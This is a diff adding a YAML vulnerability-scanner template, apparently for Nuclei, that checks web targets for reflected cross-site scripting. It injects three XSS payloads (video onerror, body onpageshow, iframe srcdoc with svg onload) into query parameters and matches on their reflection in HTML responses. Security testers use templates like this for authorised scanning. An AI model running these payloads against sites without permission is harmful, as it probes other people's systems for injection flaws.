@@ -1,0 +1,39 @@
+id: nawab-confirmed-xss
+
+info:
+  name: ⚡ Nawab-Confirmed-XSS ⚡
+  author: thenawabx
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      xss_payloads:
+        - "<video><source/onerror=confirm(1)>"
+        - "<body/onpageshow=alert?.(1)>"
+        - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
+
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{xss_payloads}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<video><source/onerror=confirm(1)>"
+          - "<body/onpageshow=alert?.(1)>"
+          - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+        name: html-context-only
